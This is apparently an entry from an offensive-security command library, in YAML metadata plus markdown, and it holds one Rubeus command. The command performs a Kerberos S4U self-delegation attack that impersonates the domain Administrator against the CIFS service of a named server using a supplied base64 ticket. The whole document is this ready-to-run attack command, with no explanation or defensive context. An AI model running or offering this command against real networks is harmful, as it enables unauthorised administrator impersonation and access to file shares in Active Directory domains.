---
id: 6abb28b1-ae64-41a9-b75e-0a6fdcd98163
name: Rubeus s4u impersonation with base64ticket
type: command
executor: bash
data: Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local"
  /ticket:"base64ticket"
output: null
created_at: '2023-04-06T03:56:07.821348+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
---

# Rubeus s4u impersonation with base64ticket

```bash
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
```
